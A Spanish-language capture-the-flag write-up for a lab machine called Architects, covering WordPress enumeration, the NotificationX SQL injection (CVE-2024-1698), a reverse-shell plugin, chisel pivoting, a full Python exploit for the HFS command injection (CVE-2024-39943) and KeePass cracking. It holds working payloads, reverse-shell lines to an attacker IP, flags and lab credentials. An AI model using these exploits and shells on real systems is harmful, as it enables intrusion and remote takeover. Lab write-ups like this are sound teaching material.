![[banner.png]]

### Machine Name: Architects
---

`​06 Month-09-2024`

Machine Author(s): [GalileoQ](https://app.hackthebox.com/profile/1598457) - [b0ySie7e](https://app.hackthebox.com/users/417609) 

## Description:


Difficulty:<font color="orange">Medium</font> 

### Flags:

User: `5bb745d22fc34ff77f601754fcf3cc3a`
Root: `a6937a661804a28ea7e5e5d94958a09a`


### Credentials

| Users                     | Password             |
| ------------------------- | -------------------- |
| root (host architects)    | TDSDFwkl88!d48sTa    |
| tommy (host architects)   | vkghTAEmph789129LBFF |
| administrator (wordpress) | 6E*V4mNctSvE&4KINC   |
| galileo (wordpress)       | g.thornecroft        |
| jessica (wordpress)       | CaS#$FGSf45T         |
| root (mysql db)           | Ilo&a5aT5RO8Yt94P    |
| tomydb (mysql db user)    | ueM2790ZWFCFZBjvslMy |
| (keppass none user)       | galileo.thornecroft  |

### Firewall Rules: `NONE`
---
# WriteUp
## Enumeration whith nmap

`sudo nmap -p- -open -sCV --min-rate 5000 -n -Pn 10.2.2.17 -oN Scan`
En el escaneo de nmap se logra identificar dos puertos abiertos. puerto 22/ssh y puerto 80/http 
```python
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 21:47 EDT
Nmap scan report for 10.2.2.17
Host is up (0.00070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 a2:d7:ac:38:98:81:2c:e7:a5:04:8b:a3:29:5e:e0:e9 (ECDSA)
|_  256 81:45:33:c0:3a:57:3c:64:62:d3:51:45:92:44:40:e3 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Did not follow redirect to http://architects.htb/
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:F1:E1:5A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds
```

ademas se tiene un dominio que se agregara al archivo host.
```python
❯ nano /etc/hosts

.
.
.
192.168.226.10   architects.htb
```

### Web Site

En el sitio web encontramos el siguiente contenido:

![[Pasted image 20240907220443.png]]

Además, observamos posibles usuarios:

![[Pasted image 20240907220514.png]]

También encontraremos un apartado para subir  CV en formato pdf, en el cual probaremos a subir archivos pdf maliciosos pero no tendremos ningún exito.

http://architects.htb/work-with-us/

![[Pasted image 20240907220609.png]]

Encontramos un formulario para podernos contactar con la organización.

http://architects.htb/contact/



Al registrarnos podemos ver nuestros datos en una ventana de notificaciones, este al parecer tiene la función de informar de quienes se contactaron con la organización.
![[Pasted image 20240907220939.png]]

![[Pasted image 20240907221206.png]]

La web esta usando el CMS de WordPress:

![[Pasted image 20240907221343.png]]

#### WPScan

Haciendo uso de la herramienta `wpscan` para enumerar el sitio web. 

```python
❯ wpscan --url http://architects.htb/
```

Encontramos un plugin `notificationx` que no esta actualizado
![[Pasted image 20240907221628.png]]

#### Nuclei

Haciendo uso de `nuclei` vamos a seguir investigando sobre el sitio web para identificar otras vulnerabilidades

```python
❯ nuclei --target http://architects.htb
```

![[Pasted image 20240907223238.png]]

Encontramos que el plugin que no esta actualizado tiene una vulnerabilidad y además que se puede enumerar usuarios validos.

```python
.
.
[CVE-2024-1698] [http] [critical] http://architects.htb/wp-json/notificationx/v1/analytics
.
.
[wordpress-user-enum] [http] [info] http://architects.htb/?author=1 ["author/administrator"] 
.
.
[wp-user-enum:usernames] [http] [low] http://architects.htb/wp-json/wp/v2/users/ ["administrator"]
.
.
```

### Vulnerabilidades

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad                                     | Tipo                  | Nivel | Link                                                                                                                                                                                                                                                                     |
| -------------- | --------------------------------------------------------------- | --------------------- | ----- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| CVE-2024-1698  | Unauthenticated SQL Injection in NotificationX WordPress Plugin | SQL Injection (Blind) | 9.8   | [link](https://www.vicarius.io/vsociety/posts/decoding-the-unseen-threat-exploiting-cve-2024-1698-unauthenticated-sql-injection-in-notificationx-wordpress-plugin-from-basics-to-breach-a-comprehensive-guide-to-source-code-analysis-and-crafting-the-ultimate-exploit) |
|                |                                                                 |                       |       |                                                                                                                                                                                                                                                                          |
|                |                                                                 |                       |       |                                                                                                                                                                                                                                                                          |
### Enumeración de usuarios

Teniendo en cuenta lo que se encontró anteriormente podremos enumerar los usuarios. en el numero 1 tenemos a `administrator`

http://architects.htb/?author=1 

![[Pasted image 20240907223951.png]]

También probaremos con los usuarios que encontramos en el sitio web 

```python
Carla Sommons
Jose Milane
Galileo Thornecroft
Sophia Carter
Ethan Brooks
Jessica Winslow
```

Entonces encontraremos a tres usuario los cuales son:

http://architects.htb/?author=2

![[Pasted image 20240907224306.png]]

http://architects.htb/?author=3

![[Pasted image 20240907224344.png]]

http://architects.htb/?author=4
para el numero 4 no tenemos resultado por lo cual podemos deducir que solo tenemos 3 usuarios validos
![[Pasted image 20240907224436.png]]

### Plugin NotificationX

Buscando información acerca del plugin y la vulnerabilidad que nos reporto la herramienta `wpscan` y `nuclei` podremos encontrar lo siguiente:

![[Pasted image 20240907224815.png]]

En el siguiente sitio web encontraremos [ Exploiting CVE-2024-1698 - Unauthenticated SQL Injection in NotificationX WordPress Plugin](https://www.vicarius.io/vsociety/posts/decoding-the-unseen-threat-exploiting-cve-2024-1698-unauthenticated-sql-injection-in-notificationx-wordpress-plugin-from-basics-to-breach-a-comprehensive-guide-to-source-code-analysis-and-crafting-the-ultimate-exploit) mas información de como se explota y todos los detalles de la vulnerabilidad.

Esta vulnerabilidad permite realizar una sql-injection que se puede usar para extraer credenciales de los usuario del sitio web

```python
time curl http://localhost/wp-json/notificationx/v1/analytics -d 'nx_id=1337&type=clicks`=IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null)-- -'
```

Para testear si el sitio web http://architects.htb es vulnerable replicaremos lo que nos indica el sitio web.

```python
❯ time curl http://architects.htb/wp-json/notificationx/v1/analytics -d 'nx_id=1337&type=clicks`=IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null)-- -'
```

obtenemos una respuesta `{"success":true}` esto nos indica que efectivamente es vulnerable
![[Pasted image 20240907225602.png]]

### Foothold
---

Ahora explotaremos la vulnerabilidad que encontramos del plugin de wordpress.

### CVE-2024-1698

Para poder explotar la vulnerabilidad podemos hacer uso del siguiente script:

- [CVE-2024-1698 Exploit Script - Wordpress NotificationX <= 2.8.2 - SQL Injection](https://github.com/kamranhasan/CVE-2024-1698-Exploit)

analizamos el exploit y primero debemos modificar la `URL` para que apunte a nuestra web y también nos damos cuenta que se esta haciendo referencia al `id` del usuario el cual hemos enumerado anteriormente y obtuvimos 3 usuarios validos 

![[Pasted image 20240907230828.png]]

vamos a realizar una primera prueba para el `id=1` el cual ya sabemos que pertenece al usuario `administrator` y obtenemos un `hash`
![[Pasted image 20240907233728.png]]

realizamos una segunda prueba para el identificador `id=2` y obtenemos efectivamente al usuario `galileo` con su `hash`
![[Pasted image 20240908000551.png]]

finalmente obtenemos los usuarios y los hash.
```python
administrator : $P$BaH1/QwhsSo2APObvpFwQvhZi/60Aq/
galileo : $P$Bi0Troerz3SXtQPHhRXfs3pQ2Q18Qs1
jessica : $P$B6NUPpzHNGxY0uoKhJL5QOIEg2XAgC.
```

### Generar Wordlist

Al tratar de crackear con el diccionario de `rockyou.txt` no obtendremos nada. Por lo que vamos a generar una wordlist personalizada con los nombres y apellidos de todos los usuarios de la web

```python
❯ cat user_list.txt

Carla Sommons
Jose Milane
Galileo Thornecroft
Sophia Carter
Ethan Brooks
Jessica Winslow
```

Para generar la wordlist podemos hacer uso de la herramienta [username-anarchy](https://github.com/urbanadventurer/username-anarchy)

```python
❯ ./username-anarchy -i user_list.txt > userWordlist.txt
```

Una vez generada podemos crackear con `John The Ripper`

```python
❯ john --wordlist=userWordlist.txt users_hash.txt
```

![[Pasted image 20240908002234.png]]

finalmente obtenemos un par de credenciales 

```python
Username: galileo
Passwd: g.thornecroft
```

### Fuzzing con gobuster
realizamos un escaneo con gobuster y encontramos el directorio `/loging` 
![[Pasted image 20240908003202.png]]

`login`
![[Pasted image 20240908003513.png]]

![[Pasted image 20240908003702.png]]

### Getting a revershell

Una vez que tenemos acceso tendremos que obtener una revershell, esto con ayuda de  [reverse-shell](https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell). Para esto tendremos el cargar un plugin malicioso que contenga una revershell. apuntando a nuestra dirección IP y puerto, luego comprimiéremos este archivo en un `.zip` para subir como plugin

```python
<?php
/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.2.19/9001 0>&1'");
?>
```

comprimir el archivo.

```python
❯ zip revershell.zip revershell.php
  adding: revershell.php (deflated 28%)
```

establecemos nuestra escucha con netcat
![[Pasted image 20240908010823.png]]

Ahora para subir el `.zip` iremos a `Plugins` > `Add New Pluging` > `upload plugin` > `Install Now`
![[Pasted image 20240908010330.png]]

finalmente hacemos clic en `Activate Plugin`
![[Pasted image 20240823134328.png]]

obtenemos conexión como el usuario `www-data` y con la pequeña enumeración principal ya podemos darnos cuenta que no estamos en la maquina host principal. estamos en otro host el cual a primera imprecisión parece ser un contenedor.
![[Pasted image 20240908011017.png]]

## Lateral Movement
---

### 172.18.0.4 - wordpress

Observamos que nos encontramos en un contenedor, para enumerar los Hosts activos dentro de la red `172.18.0.4/16`  haremos uso de :

- [https://github.com/b0ySie7e/HostPortEnumerator.git](https://github.com/b0ySie7e/HostPortEnumerator.git)

Para subir a la maquina comprometida haremos uso de un servidor en `python3`.

```python
❯ python3 -m http.server 80
```

Para descargar el script usaremos `wget`

```python
wget http://192.168.226.5/HostPortEnumerator.sh
chmod +x HostPortEnumerator.sh
```

Ahora ejecutaremos el script:

```python
./HostPortEnumerator.sh -H 172.18.0.1-254
```

Observamos que tenemos 3 hosts activos `172.18.0.1` , `172.18.0.2` , `172.18.0.4`. Ahora procederemos a enumerar los puertos de los hosts activos.
![[Pasted image 20240908012158.png]]

`Enumeracion de puertos `
```python
./HostPortEnumerator.sh -P 172.18.0.1

./HostPortEnumerator.sh -P 172.18.0.2

./HostPortEnumerator.sh -P 172.18.0.4
```

el host `172.18.0.1` tiene el puerto 22 y el 80 abiertos por lo que quiero pensar que este es el host principal.
el host `172.18.0.2` tiene el puerto 3306 abierto. este host esta albergando la base de datos
el host `172.18.0.4` tiene el puerto 80 abierto. este es el que nos interesa ya que los otros dos no se pueden explotar
![[Pasted image 20240908012806.png]]

Entonces realizaremos un port forwarding del puerto `80` del host `172.18.0.4`. Para ello usaremos la herramienta `chisel`.

- [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

Para subir el binario de chisel haremos uso de python3

```python
 ❯ python3 -m http.server 80
```

```python
wget http://192.168.226.5/chisel    
chmod +x chisel
```

#### Port Forwarding

Para realizar port forwarding y para tener mas informacion de realizarlo podemos revisar el siguiente sitio web:

- [https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)

Maquina atacante:

```python
❯ ./chisel server  --reverse --port 8888
```

Maquina cliente - 172.18.0.4 

```python
./chisel client 10.2.2.19:8888 R:8001:172.18.0.4:80 
```

Luego de realizar el port forwarding podremos ver el sitio web de host `172.18.0.4`

![[Pasted image 20240908014059.png]]

`CV Directory`
en este directorio podemos ver que se están cargando los CV en formato PDF del apartado de la web principal
![[Pasted image 20240908135424.png]]

`reports Directory`
en este directorio podemos ver un reporte en formato pdf
![[Pasted image 20240908135502.png]]

`Server Status Report`
podemos ver que este reporte se ha generado a las 00:00 horas esto puede ser una tarea importante a tener en cuenta
![[Pasted image 20240908135734.png]]

`Enumeracion del sitio web`
analizando el código fuente de la web observamos el sombre de este servicio que es una HFS (HTTP File Server) y tenemos también la versión (0.52.9). dejar este tipo de información al descubierto es potencialmente peligroso ya que esto nos facilita la búsqueda de exploit en versiones vulnerables 
![[Pasted image 20240908135124.png]]

`Login`
en el botón de login nos salta un pop-up que nos pedirá las credenciales para logearnos en este servicio. haciendo pruebas rápidas de credenciales por defecto identificamos que las credenciales son 

```python
Username: admin
Password: admin
```

![[Pasted image 20240908140315.png]]

### HFS
hemos iniciado correctamente en el servicio HFS y verificamos que la versión en uso es `0.52.9.`
![[Pasted image 20240908140728.png]]

Investigando un poco sobre `HFS 0.52.9` encontraremos que esta versión es vulnerable y se puede ejecutar comandos.
![[Pasted image 20240908141012.png]]

Para tener mas detalles puedes revisar el siguiente sitio web:

- [https://cybersecuritynews.com/poc-exploit-http-file-server/](https://cybersecuritynews.com/poc-exploit-http-file-server/)

#### CVE-2024-39943

Procederemos a explotar la vulnerabilidad de HFS, el exploit que usaremos será el siguiente:

- [https://github.com/truonghuuphuc/CVE-2024-39943-Poc](https://github.com/truonghuuphuc/CVE-2024-39943-Poc)

Este exploit es un RCE que en los parámetros necesita URL, COOKIE, IP, PORT.

`Exploit`
```python
import requests as req
import base64

url = input("Url: ")
cookie = input("Cookie: ")
ip = input("Ip: ")
port = input("Port: ")

headers = {"x-hfs-anti-csrf":"1","Cookie":cookie}

print("Step 1 add vfs")
step1 = req.post(url+"~/api/add_vfs", headers=headers, json={"parent":"/","source":"/tmp"})

print("Step 2 set permission vfs")
step2 = req.post(url+"~/api/set_vfs", headers=headers, json={"uri":"/tmp/","props":{"can_see":None,"can_read":None,"can_list":None,"can_upload":"*","can_delete":None,"can_archive":None,"source":"/tmp","name":"tmp","type":"folder","masks":None}})

print("Step 3 create folder")
command = "ncat {0} {1} -e /bin/bash".format(ip,port)
command = command.encode('utf-8')
payload = 'poc";python3 -c "import os;import base64;os.system(base64.b64decode(\''+base64.b64encode(command).decode('utf-8')+"'))"
step3 = req.post(url+"~/api/create_folder", headers=headers, json={"uri":"/tmp/","name":payload})

print("Step 4 execute payload")
step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
```

`Paso-1`
recopilar las cookies. en este caso el hfs esta arrastrando 2 cookies asi que vamos a copiar esto
![[Pasted image 20240908141951.png]]

`paso-2`
establecer la escucha con netcat

`paso-3`
ejecutar el exploit. en este caso parece que todo se ha ejecutado correctamente pero no hemos recibido nada así que vamos a analizar esto.
![[Pasted image 20240908144056.png]]

### Log
vamos a ver el apartado de log para poder analizar la petición que hemos realizado. esta petición va encodeada en base64 así que vamos a decodearla
![[Pasted image 20240908144410.png]]

`base64 -d`
el exploit esta utilizando una conexión de netcat para enviarnos una reverse shell. probablemente el host no tiene la herramienta netcat así que vamos a realizar una pequeña modificación 
![[Pasted image 20240908144528.png]]

`exploit`
identificamos la linea en nuestro código y realizamos un cambio para enviarnos una reverse shell con bash
![[Pasted image 20240908144851.png]]

`exploit modificado`
```python
import requests as req
import base64 

url = input("Url: ")
cookie = input("Cookie: ")
ip = input("Ip: ")
port = input("Port: ")

headers = {"x-hfs-anti-csrf":"1","Cookie":cookie}

print("Step 1 add vfs")
step1 = req.post(url+"~/api/add_vfs", headers=headers, json={"parent":"/","source":"/tmp"})

print("Step 2 set permission vfs")
step2 = req.post(url+"~/api/set_vfs", headers=headers, json={"uri":"/tmp/","props":{"can_see":None,"can_read":None,"can_list":None,"can_upload":"*","can_delete":None,"can_archive":None,"source":"/tmp","name":"tmp","type":"folder","masks":None}})

print("Step 3 create folder")
command = "bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} 0<&1'".format(ip,port)
command = command.encode('utf-8')
payload = 'poc";python3 -c "import os;import base64;os.system(base64.b64decode(\''+base64.b64encode(command).decode('utf-8')+"'))"
step3 = req.post(url+"~/api/create_folder", headers=headers, json={"uri":"/tmp/","name":payload})

print("Step 4 execute payload")
step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
```

### reverse shell
ejecutamos el exploit y efectivamente esta ves obtenemos una reverse shell
![[Pasted image 20240908160423.png]]

### Enumeración del host HFS
en la enumeración del host contamos que somos root principalmente y podemos darnos cuenta que el administrador ha olvidado enlazar el archivo `.bash_history` al `/dev/null` por lo que al leer el archivo podemos ver credenciales en texto plano sobre una conexión ssh. ahora solo debemos enumerar el host
```python
sshpass -p GtPs14tyUAcV -u galileo
```

![[Pasted image 20240908181549.png]]

`HostPortEnumerator`
para la enumeración del host vamos a utilizar el mismo script que usamos anteriormente. pero debido a que esta maquina no tiene las herramientas comunes `curl` , `wget` , `netcat` `python` vamos a utilizar una función que nos permitirá imitar la función de `curl` 

`Función`
```python
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
```

ahora simplemente llamamos a la función `__curl` 
![[Pasted image 20240908195249.png]]

también vamos a necesitar el binario de `pingu` ya que la maquina no tiene `ping`

- [https://github.com/sheepla/pingu/releases](https://github.com/sheepla/pingu/releases)

Para ello debemos de descargarlo:

```python
❯ tar -zxvf pingu_0.0.5_Linux_x86_64.tar.gz
```

ahora solo debemos hacer una pequeña modificación en el script para llamar a nuestro binario `pingu`
![[Pasted image 20240908202356.png]]

`HostPortEnumerator`
haciendo una nueva enumeración logramos identificar el host en este caso es `172.30.0.12` así que ahora que tenemos toda esta información intentaremos conectarnos por ssh 
![[Pasted image 20240908203350.png]]

### ssh

```python
Username: galileo

Passwd: GtPs14tyUAcV
```

![[Pasted image 20240908163828.png]]

`scp`
encontramos un archivo `Passwords.kdbx` así que vamos a salir de la conexión ssh para poder copiar este archivo al host anterior ya que será mas fácil para luego enviarlo al primer host. donde esta la web principal para luego enviarlo a la maquina atacante. este proceso se puede automatizar usando `ligolo` o `socat`

```python
scp -r galileo@172.30.0.12:/home/galileo/Passwords.kdbx ./
```

![[Pasted image 20240908204654.png]]

### Tunneling and forward 

```python
P1: Crear un servidor en python en el host HFS para poder compartir el archivo `Passwords.kdbx`

P2: Ejecutamos ./chisel client 10.2.2.19:8888 R:9001:socks en el host www-data

P3: Ejecutamos proxychains wget http://172.18.0.2:8000/Passwords.kdbx en la maquina atacante
```

![[Pasted image 20240908222500.png]]

Para abrir el archivo de keepass podemos instalar `keepassxc` y abrir el archivo

```python
sudo apt install keepassxc
keepassxc Passwords.kdbx    
```

Al abrir encontramos que este esta protegido por una contraseña.
![[Pasted image 20240908231016.png]]

`keepass2jhon`
keepass2jhon no es capaz de crackear esto ya que no tiene soporte para la versión 4
![[Pasted image 20240908231120.png]]

Investigando un poco encontré como crackear versión 4 de keepass.

- [https://github.com/r3nt0n/keepass4brute.git](https://github.com/r3nt0n/keepass4brute.git)

Haciendo uso de este este script y la wordlist que generamos anteriormente encontraremos la contraseña.

```python
❯ ./keepass4brute.sh Passwords.kdbx userWordlist.txt
```

![[Pasted image 20240908232139.png]]


![[Pasted image 20240908232310.png]]